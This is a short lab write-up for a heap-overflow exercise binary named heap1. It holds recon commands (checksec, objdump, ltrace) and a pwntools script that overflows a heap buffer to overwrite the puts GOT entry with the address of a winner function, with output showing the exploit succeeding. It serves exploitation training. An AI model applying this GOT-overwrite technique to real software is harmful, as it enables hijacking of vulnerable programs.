
```
❯ file heap1
heap1: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, BuildID[sha1]=b865daaa63240ed42d0ad57958409be9d24a4063, for GNU/Linux 3.2.0, with debug_info, not stripped
```

```
❯ checksec heap1
[*] '/home/cy023/project/AD_2022/linux_heap_exploit/heap1/heap1'
    Arch:     i386-32-little
    RELRO:    No RELRO
    Stack:    No canary found
    NX:       NX disabled
    PIE:      No PIE (0x8048000)
    RWX:      Has RWX segments
```

```
❯ objdump -t ./heap1 | grep winner
080491b6 g     F .text  00000038              winner

❯ objdump -R ./heap1 | grep puts
0804b24c R_386_JUMP_SLOT   puts@GLIBC_2.0
```

```
❯ ldd ./heap1
        linux-gate.so.1 (0xf7fae000)
        libc.so.6 => /lib/i386-linux-gnu/libc.so.6 (0xf7d5d000)
        /lib/ld-linux.so.2 (0xf7fb0000)
```

```
❯ ltrace ./heap1 0000 1111
__libc_start_main(0x80491ee, 3, 0xffd34524, 0 <unfinished ...>
malloc(8)                                                                                   = 0x9a011a0
malloc(8)                                                                                   = 0x9a011b0
malloc(8)                                                                                   = 0x9a011c0
malloc(8)                                                                                   = 0x9a011d0
strcpy(0x9a011b0, "0000")                                                                   = 0x9a011b0
strcpy(0x9a011d0, "1111")                                                                   = 0x9a011d0
puts("and that's a wrap folks!"and that's a wrap folks!
)                                                            = 25
+++ exited (status 0) +++
```

```
from pwn import *

elf = ELF('./heap1', checksec=False)

payload1 = (b'A' * 20 + flat(elf.got['puts']))
payload2 = flat(elf.sym['winner'])
p = elf.process(argv=[payload1, payload2])

print(payload1)
print(payload2)
print(p.read().decode('utf-8'))
```

```
❯ python3 heap1_exploit.py
[+] Starting local process '/home/cy023/project/AD_2022/linux_heap_exploit/heap1/heap1': pid 24088
b'AAAAAAAAAAAAAAAAAAAAL\xb2\x04\x08'
b'\xb6\x91\x04\x08'
[*] Process '/home/cy023/project/AD_2022/linux_heap_exploit/heap1/heap1' stopped with exit code 0 (pid 24088)
and we have a winner @ 1672296784
```
